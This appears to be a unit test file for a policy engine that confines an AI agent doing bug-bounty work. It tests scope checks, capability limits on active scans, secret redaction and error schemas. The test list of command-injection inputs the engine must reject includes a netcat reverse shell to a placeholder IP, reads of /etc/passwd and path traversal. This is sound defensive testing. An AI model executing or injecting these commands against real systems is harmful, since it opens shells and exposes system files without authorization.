import assert from "assert";
import { PolicyEngine } from "../policy/engine.js";
import { CapabilityLevel } from "../policy/permissions.js";
import { redactSecrets, redactObject } from "../policy/redaction.js";
import { McpErrorCode, createMcpError } from "../schemas/errors.js";

async function runUnitTests() {
  console.log("====================================================");
  console.log("   BountyOS MCP Control Plane — Unit Test Suite     ");
  console.log("====================================================\n");

  const policy = new PolicyEngine();

  // Test 1: Scope Validation (Exact match)
  console.log("1. Testing exact scope validation...");
  const rules = [
    { target: "target.local", target_type: "domain", out_of_scope: false },
    { target: "forbidden.target.local", target_type: "domain", out_of_scope: true },
    { target: "*.target.local", target_type: "wildcard", out_of_scope: false },
  ];

  const exactCheck = policy.validateScope("target.local", rules);
  assert.strictEqual(exactCheck.allowed, true, "Exact in-scope domain should be allowed");
  console.log("   ✓ Exact match passed");

  // Test 2: Out of Scope Exclusion Precedence
  console.log("2. Testing out-of-scope exclusion precedence...");
  const outCheck = policy.validateScope("forbidden.target.local", rules);
  assert.strictEqual(outCheck.allowed, false, "Excluded target must be strictly denied");
  assert.match(outCheck.reason, /outside authorized scope/i);
  console.log("   ✓ Out-of-scope exclusion passed");

  // Test 3: Wildcard Subdomain Matching
  console.log("3. Testing wildcard subdomain resolution...");
  const wildCheck = policy.validateScope("api.target.local", rules);
  assert.strictEqual(wildCheck.allowed, true, "Wildcard subdomain should be allowed");
  console.log("   ✓ Wildcard matching passed");

  // Test 4: Unlisted Target Rejection (Whitelist model)
  console.log("4. Testing unlisted external target rejection...");
  const unlistedCheck = policy.validateScope("evil.com", rules);
  assert.strictEqual(unlistedCheck.allowed, false, "Unlisted target must be denied");
  console.log("   ✓ Default-deny whitelist policy passed");

  // Test 5: Dangerous Shell Metacharacter Rejection
  console.log("5. Testing command injection & argument validation...");
  const dangerousInputs = [
    "target.local; id",
    "target.local && whoami",
    "target.local | nc -e /bin/sh 1.2.3.4 4444",
    "`cat /etc/passwd`",
    "target.local$(whoami)",
    "../../etc/passwd",
  ];

  for (const input of dangerousInputs) {
    const err = policy.validateInput(input, "target");
    assert.ok(err !== null, `Input '${input}' must be rejected by policy engine`);
    assert.strictEqual(err.error.code, McpErrorCode.INVALID_ARGUMENT);
  }
  console.log("   ✓ All command injection vectors successfully rejected");

  // Test 6: Capability Level Enforcement
  console.log("6. Testing capability level permissions...");
  const passiveErr = policy.checkPermission("scope.get");
  assert.strictEqual(passiveErr, null, "Passive queries should be permitted");

  const restrictedPolicy = new PolicyEngine();
  (restrictedPolicy as any).allowedLevel = CapabilityLevel.PASSIVE;
  const activeBlocked = restrictedPolicy.checkPermission("scan.vulnerabilities");
  assert.ok(activeBlocked !== null, "Active scan must be blocked under PASSIVE capability level");
  assert.strictEqual(activeBlocked.error.code, McpErrorCode.POLICY_DENIED);
  console.log("   ✓ Capability level boundary checks passed");

  // Test 7: Secret Redaction Engine
  console.log("7. Testing secret and credential redaction...");
  const rawTranscript = `
    POST /login HTTP/1.1
    Authorization: Bearer secret_jwt_token_12345
    Cookie: session_token=secret_cookie_abcdef
    {"username": "admin", "password": "super_secret_password_999"}
  `;
  const sanitized = redactSecrets(rawTranscript);
  assert.ok(!sanitized.includes("secret_jwt_token_12345"), "JWT token must be scrubbed");
  assert.ok(!sanitized.includes("super_secret_password_999"), "Password must be scrubbed");
  assert.ok(!sanitized.includes("secret_cookie_abcdef"), "Cookie token must be scrubbed");
  assert.ok(sanitized.includes("[REDACTED_SECRET]"), "Scrubbed tokens must be replaced with marker");
  console.log("   ✓ Secret scrubbing passed");

  // Test 8: Structured Error Responses
  console.log("8. Testing MCP error schemas...");
  const mcpErr = createMcpError(McpErrorCode.SCOPE_DENIED, "Access denied to unauthorized asset", false);
  assert.strictEqual(mcpErr.error.code, "SCOPE_DENIED");
  assert.strictEqual(mcpErr.error.retryable, false);
  console.log("   ✓ Error schemas validated");

  console.log("\n====================================================");
  console.log("   ALL UNIT TESTS PASSED WITH 100% SUCCESS!         ");
  console.log("====================================================\n");
}

runUnitTests().catch((e) => {
  console.error("Unit test failure:", e);
  process.exit(1);
});
